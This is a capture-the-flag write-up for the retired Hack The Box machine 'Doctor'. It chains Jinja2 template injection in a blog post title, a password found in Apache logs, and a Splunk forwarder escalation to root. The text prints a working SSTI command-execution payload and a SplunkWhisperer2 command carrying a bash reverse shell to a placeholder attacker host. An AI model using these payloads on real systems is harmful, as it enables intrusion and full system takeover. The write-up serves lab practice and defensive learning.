---
machine: Doctor
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, ssti, jinja2, vhost, splunk, splunkwhisperer2]
---

# Doctor — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A medical portal with a **virtual host**, `doctors.htb`. Message titles are rendered with Jinja2: **SSTI** giving a shell as `web`. That user is in the **`adm`** group, so it reads `/var/log/apache2/backup`, where a password from a reset email was logged: `su shaun`. The same password opens **Splunk Web (8.0.5) on 8089**, and **SplunkWhisperer2** runs as root because `splunkd` runs as root.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh     OpenSSH 8.2p1 Ubuntu
80/tcp    http    Apache httpd 2.4.41
8089/tcp  ssl/http Splunkd
```

By IP there is a simple page with `info@doctors.htb`:

```bash
curl -s http://<IP>/ | grep -i doctor
echo "<IP> doctors.htb" | sudo tee -a /etc/hosts
```

The vhost hosts a blog with registration and "New Message". Port 8089 is the Splunk 8.0.5 management console, asking for basic auth.

## Access: SSTI in the message title

Publish a post titled `{{7*7}}` and visit `/archive`:

```text
49
```

Jinja2 confirmed. Execution payload:

```text
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Launch a reverse shell and land as `uid=1001(web)`, with the `adm` group:

```bash
id
# uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

## From web to shaun

`adm` grants log read. Searching logs for passwords surfaces `shaun`'s reset:

```bash
grep -ri "password" /var/log/apache2/ 2>/dev/null
cat /var/log/apache2/backup
```

```text
... /reset?email=shaun&password=Guitar123 ...
```

```bash
su shaun
cat ~/user.txt
```

## Escalation with Splunk

```bash
ps -ef | grep splunkd
# root  1141  1  ... splunkd -p 8089 start
```

`splunkd` runs as root and `shaun`'s password is reused on the Splunk console. With those credentials, **SplunkWhisperer2** abuses the universal forwarder to run commands:

```bash
git clone https://github.com/cnotin/SplunkWhisperer2
python3 SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
  --host <IP> --port 8089 --username shaun --password '<password>' \
  --payload "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'"
```

The shell returns as root and `/root/root.txt` is readable.

## Lessons

- SSTI in a field that looks decorative (a post title) is remote execution.
- `adm` means log read, and logs keep passwords people type into forms.
- Reusing the system password in a monitoring tool is the escalation: Splunk runs as whoever started it.
- Detection: titles containing `{{` or `__globals__`, and `splunkd` spawning `bash` through the forwarder.
